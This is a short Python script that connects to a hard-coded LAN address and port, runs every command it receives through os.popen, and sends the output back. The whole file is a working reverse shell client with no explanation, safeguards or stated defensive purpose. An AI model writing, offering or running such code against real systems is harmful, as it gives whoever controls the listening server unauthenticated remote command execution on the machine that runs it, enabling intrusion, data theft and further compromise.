import socket
import threading
import os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.178.37', 55555))
print("CONNECTED")

def receive():
    while True:
        try:
            message = client.recv(1024).decode('ascii')
            print(message)
            try:
                out = os.popen(message)
                str_out = out.read()
                client.send(str(str_out).encode('ascii'))
            except:
                print("NO VALID COMMAND")
        except:
            print("something went wrong!")
            client.close()
            break

receive()